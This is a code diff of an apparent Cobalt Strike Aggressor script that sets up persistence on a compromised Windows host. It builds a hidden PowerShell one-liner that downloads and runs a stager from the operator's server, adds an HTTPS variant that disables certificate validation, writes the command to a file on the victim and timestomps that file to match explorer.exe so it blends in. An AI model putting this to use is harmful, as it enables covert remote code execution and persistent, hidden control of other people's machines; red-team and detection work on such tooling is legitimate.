@@ -94,17 +94,31 @@ alias persistence {
 ########### Subroutines #############
 sub checkPSpayload{
     foreach $site (sites()) {
-       if ($site['Description'] eq "PowerShell Web Delivery"){
+        # Site description was updated in CS 3.X from "PowerShell Web Delivery" to "Scripted Web Delivery (powershell)"
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
            return true;
        }
     }
-}
+}  
 sub uploadPSpayload {
     foreach $site (sites()) {
-       if ($site['Description'] eq "PowerShell Web Delivery"){
-           $downloadstring = "http://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
-           $data = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
-           bupload_raw($1, $payloadPath, $data);
+       if ($site['Description'] eq "Scripted Web Delivery (powershell)"){
+            if ($site['Port'] eq '443' ){
+                binput($1, "[*] Using HTTPS Powershell Stager");
+                # Modified to allow staging over HTTPs if a self-signed cert is used
+                # Add HTTPS over HTTP
+                $downloadstring = "https://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
+                # Disable certficate validation checking
+                $data = 'powershell.exe -nop -w hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};'; 
+                $data = $data . "IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
+            }
+            else {
+                $downloadstring = "http://" . $site['Host'] . ":" . $site['Port'] . $site['URI'];
+                $data = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'" . $downloadstring . "\'))\"";
+            }
+            binput($1, "[*] Attempting to upload persistence file: $2");
+            bupload_raw($1, $2, $data);
+            btimestomp($1,$2,'C:\Windows\explorer.exe')
        }
     }
 }
